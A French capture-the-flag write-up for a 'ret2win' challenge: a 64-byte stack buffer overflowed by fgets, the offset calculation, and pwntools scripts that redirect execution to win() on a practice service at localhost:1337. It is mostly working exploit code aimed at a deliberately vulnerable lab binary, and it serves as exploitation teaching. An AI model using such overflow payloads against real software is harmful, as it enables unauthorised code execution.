# Challenge 3: ret2win - Writeup

## Analyse du challenge

Le programme `vuln` lit 256 octets dans un buffer de 64 octets, créant un buffer overflow classique. Il existe une fonction `win()` qui lit et affiche le flag depuis `flag.txt`. L'objectif est de rediriger l'exécution vers cette fonction.

## Analyse du binaire

### Compilation

Le binaire est compilé avec:
- `-fno-stack-protector`: pas de canary
- `-no-pie`: pas d'ASLR pour les adresses du code
- `-z execstack`: stack exécutable (non nécessaire ici mais présent)

### Vulnérabilité

Dans `main()`:
```c
char buffer[64];
fgets(buffer, 256, stdin);
```

Le buffer fait 64 octets mais `fgets` lit jusqu'à 256 octets, permettant d'écraser la sauvegarde de l'adresse de retour (saved return address).

## Exploitation

### Étape 1: Trouver l'offset

Nous devons déterminer combien d'octets écrire avant d'atteindre l'adresse de retour.

Structure de la stack:
```
[buffer 64 bytes][saved RBP 8 bytes][saved RIP 8 bytes]
```

Sur x86-64, après le buffer de 64 octets, il y a:
- 8 octets pour le saved RBP (frame pointer)
- 8 octets pour le saved RIP (return address)

Total: 64 + 8 = 72 octets avant le RIP.

### Étape 2: Trouver l'adresse de win()

Utilisons `objdump` ou `gdb`:

```bash
objdump -d vuln | grep win
```

Ou dans gdb:
```bash
gdb ./vuln
(gdb) print win
```

L'adresse sera quelque chose comme `0x401176` (exemple, dépend de la compilation).

### Étape 3: Construire le payload

Le payload doit être:
- 72 octets de padding (pour remplir buffer + RBP)
- 8 octets contenant l'adresse de `win()` en little-endian

### Étape 4: Exploitation avec Python

```python
from pwn import *

# Connexion
conn = remote('localhost', 1337)

# Adresse de win() (à déterminer avec objdump/gdb)
win_addr = 0x401176  # Exemple, à remplacer

# Construction du payload
payload = b'A' * 72  # Padding
payload += p64(win_addr)  # Adresse de win() en little-endian

# Envoi
conn.sendline(payload)
conn.interactive()
```

### Étape 5: Exploitation manuelle

Si vous préférez utiliser `echo` et `nc`:

```bash
python3 -c "from pwn import *; print(b'A'*72 + p64(0x401176))" | nc localhost 1337
```

## Détermination de l'adresse de win()

### Méthode 1: objdump

```bash
objdump -d vuln | grep -A 10 "<win>"
```

### Méthode 2: gdb

```bash
gdb ./vuln
(gdb) disassemble win
```

### Méthode 3: readelf + calcul

```bash
readelf -s vuln | grep win
```

L'adresse sera dans la colonne `Value`.

## Payload final

Une fois l'adresse déterminée (par exemple `0x401176`):

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

# Connexion
io = remote('localhost', 1337)

# Adresse de win() - À ADAPTER selon votre binaire
win_addr = 0x401176

# Payload
payload = b'A' * 72
payload += p64(win_addr)

# Envoi
io.sendline(payload)
io.interactive()
```

Ou avec pwntools en ligne de commande:

```bash
python3 -c "
from pwn import *
io = remote('localhost', 1337)
payload = b'A'*72 + p64(0x401176)
io.sendline(payload)
print(io.recvall().decode())
"
```

## Vérification de l'offset avec pattern

Si vous n'êtes pas sûr de l'offset, utilisez un pattern:

```python
from pwn import *

io = remote('localhost', 1337)
pattern = cyclic(100)
io.sendline(pattern)
io.wait()
```

Puis dans gdb, vérifiez la valeur de RIP et utilisez `cyclic_find()` pour trouver l'offset.

## Flag

Après exploitation réussie, le programme affiche:
`FLAG{ret2win_simple_2024}`

## Résumé

1. Buffer overflow: 64 bytes buffer, 256 bytes lus
2. Offset RIP: 72 bytes (64 buffer + 8 RBP)
3. Adresse win(): à déterminer avec objdump/gdb
4. Payload: 72 bytes padding + adresse win() en little-endian
5. Le flag s'affiche automatiquement quand win() s'exécute

